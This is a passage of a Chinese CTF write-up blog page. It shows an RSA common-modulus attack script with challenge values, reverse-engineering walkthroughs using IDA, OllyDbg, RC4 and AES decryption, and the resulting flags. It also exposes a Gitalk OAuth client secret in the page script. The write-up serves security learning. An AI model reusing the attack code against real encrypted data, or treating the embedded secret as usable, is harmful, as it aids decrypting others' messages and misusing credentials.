+    elif s2 &lt; 0:
+        s2 = - s2
+        c2 = invert(c2, n)
+    m = pow(c1, s1, n) * pow(c2, s2, n) % n
+    return m
+
+n= 103109065902334620226101162008793963504256027939117020091876799039690801944735604259018655534860183205031069083254290258577291605287053538752280231959857465853228851714786887294961873006234153079187216285516823832102424110934062954272346111907571393964363630079343598511602013316604641904852018969178919051627
+e1= 13
+e2= 15
+c1= 13981765388145083997703333682243956434148306954774120760845671024723583618341148528952063316653588928138430524040717841543528568326674293677228449651281422762216853098529425814740156575513620513245005576508982103360592761380293006244528169193632346512170599896471850340765607466109228426538780591853882736654
+c2= 79459949016924442856959059325390894723232586275925931898929445938338123216278271333902062872565058205136627757713051954083968874644581902371182266588247653857616029881453100387797111559677392017415298580136496204898016797180386402171968931958365160589774450964944023720256848731202333789801071962338635072065
+
+result = gongmogongji(n, c1, c2, e1, e2)
+print result
+m1=hex(50937517501984079318479184180525081694999782691988219077509947184814275476037417455150384)
+print m1
+import binascii
+m2=binascii.unhexlify(b'666c61672d3534643364623563316566636437616661353739633337626362353630616530')
+print m2
+</code></pre>
+<p>共模攻击的，把上面的exp稍微改下就行</p>
+<pre><code class="language-python"># -*- coding:utf-8 -*-
+from gmpy2 import invert
+import gmpy2
+from Crypto.Util.number import *
+def gongmogongji(n,c1,c2,e1,e2):
+    def egcd(a, b):
+        if a==0:
+            return (b, 0, 1)
+        else:
+            z,y,x=egcd(b%a,a)
+            return (z,x-(b//a)*y,y)
+    s=egcd(e1, e2)
+    s1=s[1]
+    s2=s[2]
+    # 求模反元素
+    if s1&lt;0:
+        s1=-s1
+        c1=invert(c1,n)
+    else:
+        s2=-s2
+        c2=invert(c2,n)
+    m=pow(c1,s1,n)*pow(c2,s2,n)%n
+    m=gmpy2.iroot(m,2)[0]
+    print(long_to_bytes(m))
+n=122031686138696619599914690767764286094562842112088225311503826014006886039069083192974599712685027825111684852235230039182216245029714786480541087105081895339251403738703369399551593882931896392500832061070414483233029067117410952499655482160104027730462740497347212752269589526267504100262707367020244613503
+e1=65536
+e2=270270
+c1=39449016403735405892343507200740098477581039605979603484774347714381635211925585924812727991400278031892391996192354880233130336052873275920425836986816735715003772614138146640312241166362203750473990403841789871473337067450727600486330723461100602952736232306602481565348834811292749547240619400084712149673
+c2=43941404835820273964142098782061043522125350280729366116311943171108689108114444447295511969090107129530187119024651382804933594308335681000311125969011096172605146903018110328309963467134604392943061014968838406604211996322468276744714063735786505249416708394394169324315945145477883438003569372460172268277
+gongmogongji(n, c1, c2, e1, e2)
+
+</code></pre>
+<figure data-type="image" tabindex="25"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/08/434f5ccdda677.png" alt="1636353287664.png" loading="lazy"></figure>
+<p>flag为：</p>
+<pre><code>SETCTF{now_you_master_common_mode_attack}
+</code></pre>
+<h1 id="re">RE</h1>
+<h2 id="easyre">EasyRe</h2>
+<p>直接shift+F12进行字符串查找即可</p>
+<figure data-type="image" tabindex="26"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/08/626094c920237.png" alt="1636352773905.png" loading="lazy"></figure>
+<p>flag为：</p>
+<pre><code>flag{fc5e038d38a57032085441e7fe7010b0}
+</code></pre>
+<h2 id="findme">findme</h2>
+<p>IDA丢入，发现只能看到检查长度，而字符串比较经过测试不对，直接上OD</p>
+<figure data-type="image" tabindex="27"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/07/cb2d0c0eff96b.png" alt="1636294309508.png" loading="lazy"></figure>
+<p>难怪IDA没识别出来，因为eax不确定，下个断点，我取到了call eax调用的函数，进IDA继续分析</p>
+<figure data-type="image" tabindex="28"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/07/12b0be2a25c8c.png" alt="1636294341143.png" loading="lazy"></figure>
+<p>em,RC4加密，稳了</p>
+<figure data-type="image" tabindex="29"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/07/76bff0e08f6cb.png" alt="1636294381005.png" loading="lazy"></figure>
+<p>内存dump出加密数据，直接解密</p>
+<figure data-type="image" tabindex="30"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/07/5596d9e5a67f5.png" alt="1636294411181.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="31"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/07/cbaa6a3b6b232.png" alt="1636294422229.png" loading="lazy"></figure>
+<p>flag为：</p>
+<pre><code>SETCTF{Th1s_i5_E2_5tRcm9!}
+</code></pre>
+<h2 id="power">power</h2>
+<p>记事本打开瞅一波</p>
+<figure data-type="image" tabindex="32"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/08/64544358ad978.png" alt="1636352792656.png" loading="lazy"></figure>
+<p>有很多含有aes的字符串，继续往下</p>
+<figure data-type="image" tabindex="33"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/08/7dc23770d6956.png" alt="1636352804017.png" loading="lazy"></figure>
+<p>发现个<code>this_is_a_key!!!</code></p>
+<p>这下aes应该跑不脱了，直接网站解密即可</p>
+<figure data-type="image" tabindex="34"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/11/08/fe722a2c3bcc4.png" alt="1636352821308.png" loading="lazy"></figure>
+<p>flag为：</p>
+<pre><code>flag{y0u_found_the_aes_12113112}
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#web">Web</a>
+<ul>
+<li><a href="#checkin">CheckIN</a></li>
+</ul>
+</li>
+<li><a href="#misc">Misc</a>
+<ul>
+<li><a href="#%E6%89%93%E8%B4%A5%E7%97%85%E6%AF%92">打败病毒</a></li>
+<li><a href="#soeasycheckin">soEasyCheckin</a></li>
+<li><a href="#sos">SOS</a></li>
+</ul>
+</li>
+<li><a href="#pwn">PWN</a>
+<ul>
+<li><a href="#h3apclass">h3apclass：</a></li>
+<li><a href="#bbbaby">bbbaby:</a></li>
+<li><a href="#magic">Magic：</a></li>
+</ul>
+</li>
+<li><a href="#crypto">Crypto</a>
+<ul>
+<li><a href="#mostlycommon">mostlycommon</a></li>
+</ul>
+</li>
+<li><a href="#re">RE</a>
+<ul>
+<li><a href="#easyre">EasyRe</a></li>
+<li><a href="#findme">findme</a></li>
+<li><a href="#power">power</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/2021东华杯PKWSEC_Writeup/">
+              <h3 class="post-title">
+                2021年全国大学生网络安全邀请赛暨第七届&#34;东华杯&#34;上海市大学生网络安全大赛Writeup
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
